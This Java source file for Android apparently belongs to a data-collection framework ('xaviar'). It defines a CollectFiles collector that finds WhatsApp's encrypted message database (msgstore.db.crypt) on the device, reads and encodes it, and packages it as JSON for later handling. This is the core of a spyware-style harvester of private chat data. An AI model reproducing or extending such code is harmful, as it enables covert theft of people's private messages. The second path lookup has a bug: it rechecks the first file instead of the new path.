package com.xaviar.collect.files;


import java.io.File;
import java.io.IOException;
import java.util.Collection;
import java.util.LinkedList;
import java.util.List;
import java.util.Map;
import java.util.TreeMap;

import android.content.Context;
import android.os.Environment;
import android.util.Log;

import com.xaviar.collect.packages.PackageEntry;
import com.xaviar.frm.DataHolder;
import com.xaviar.frm.ICollector;
import com.xaviar.frm.ThreadCollector;
import com.xaviar.utils.BinUtil;

import flexjson.JSONSerializer;

public class CollectFiles extends ThreadCollector implements ICollector {

	private  static String name = "CollectFiles";
	private static final String TAG = name;
	//private static final String whatsPath2 = "/data/data/com.whatsapp/databases/";
	//private static final String whatsupDir = "/mnt/sdcard/WhatsApp/Databases/";
	//private static final String whatupDB = "msgstore.db.crypt";
	private static final String WHATSUP_FILE = "WhatsApp/Databases/msgstore.db.crypt";
	private static final String WHATSUP_APP = "WhatsApp";
	//private static final String whatsupFullLPath = whatsupDir + whatupDB;

	public CollectFiles(String genericData) {
		this.genericData = genericData;
	}
	
	public CollectFiles() {
		setName(CollectFiles.name);
	}


	public CollectFiles(Context ctx) {
		setContext(ctx);
	}

	@Override
	protected String getAllData() {
		Log.d(TAG, "Enter Packages getAllData()");
		List<StringFile> listFiles = getObjects(ctx);
		genericData = toJsonArray(listFiles);
		return genericData;
	}
		
	
	public List<StringFile> getObjects(Context context) {

		Map<String, String> map = getFilePathMap();
		List<StringFile> strFilelistRet = new LinkedList<StringFile>();
		for (String name : map.keySet()) {
			String filePath = map.get(name);
			try {
				StringFile stringFile = getStringFile(name, filePath);
				strFilelistRet.add(stringFile);
			} catch (IOException e) {
				e.printStackTrace();
				return strFilelistRet;
			}
		}

		return strFilelistRet;
	}
	
	private StringFile getStringFile(String name2, String filePath) throws IOException {
		 String strBuf = BinUtil.FileToEncodeString(filePath);
		 StringFile stringFile = new StringFile();
		 stringFile.setName(name);
		 stringFile.setValue(strBuf);
		 stringFile.setPath(filePath);
		 return  stringFile;
	}

	private Map<String,String> getFilePathMap() {
		Map<String,String> filePathMap = new TreeMap<String,String>();
		String whatsupPath = getWhatsupPath(this.ctx);
		if(whatsupPath.length() > 2)
		{
		  filePathMap.put(WHATSUP_APP,getWhatsupPath(this.ctx));
		}
		//filePathMap.put("nothing","/storage/no-such-file");
		return filePathMap;
	}

	private String getWhatsupPath(Context context) {
		// try number 1
		String dirPath = Environment.getExternalStorageDirectory().getPath();
		String fullPath = dirPath + "/" + WHATSUP_FILE;
		File filecheck=new File(fullPath);
		boolean isExist = filecheck.isFile();
		if(isExist)
		{
		 return fullPath;	
		}
		// try number 2
        
		dirPath = context.getFilesDir().getPath();
		fullPath = dirPath + "/"  + WHATSUP_FILE;
		isExist = filecheck.isFile();
		if(isExist)
		{
		 return fullPath;	
		}
		
		return "";
	}

	@Override
	public String getHolderKey() {
		return DataHolder.FILE_STRING;
	}
	
	public static String toJsonArray(Collection<StringFile> collection) {
		   return new JSONSerializer().exclude("*.class").serialize(collection);
		}

}

